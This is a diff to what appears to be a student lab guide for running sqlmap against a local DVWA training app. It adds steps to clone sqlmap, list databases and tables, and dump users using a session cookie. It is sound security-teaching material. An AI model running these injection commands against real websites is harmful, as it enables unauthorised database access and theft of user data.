@@ -211,8 +211,9 @@ This home page to set up database
 3. Install SQLMap in WSL
 
 ```bash
-wsl
-sudo apt install sqlmap
+sudo apt update
+sudo apt install git
+git clone https://github.com/sqlmapproject/sqlmap.git
 ```
 
 4. Fetch the url of webiste you want to attack
@@ -223,7 +224,7 @@ Change the DVWA security to Medium (default: Low)
 ![image](https://github.com/user-attachments/assets/5b7fd915-141b-4c37-8188-6721a09b9cc5)
 
 
-Enter any value for this to retun a url : `http://localhost/vulnerabilities/sqli/?id=2`
+Enter any value for this to retun a url : `http://localhost:8080/vulnerabilities/sqli/?id=2`
 
 5. Get information about all available databases
 
@@ -233,15 +234,30 @@ Enter any value for this to retun a url : `http://localhost/vulnerabilities/sqli
 
 Get cookie value of website: PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770
 
-
+Cd into sqlmap directory after clone it from git 
 ```bash
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770; security=low " --data="id=1&Submit=Submit" --dbs
+cd sqlmap
+```
+Then use python command to run sqlmap.py with following parameters
+```bash
+python3 sqlmap.py -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs --cookie="PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770; security=low" --random-agent
 ```
 
-![image](https://github.com/user-attachments/assets/fed822f7-00be-4b8d-8176-ec7a79265298)
+![image](https://github.com/user-attachments/assets/1fd15067-c346-4145-8f25-c93ae5470018)
+
 
 
 Return 2 available databases named : dvwa and information_schema
 
+**Answer 1**:
+Use sqlmap to get tables
+```bash
+python3 sqlmap.py -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770; security=low" --tables
+```
+![image](https://github.com/user-attachments/assets/b40ce90f-34de-45e5-a2dd-1a2e5a535350)
 
-
+Use sqlmap to get users
+```bash
+python3 sqlmap.py -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770; security=low" users --dump
+```
+![image](https://github.com/user-attachments/assets/0d68bf79-bb95-4a50-82c2-b4d174cd42d0)
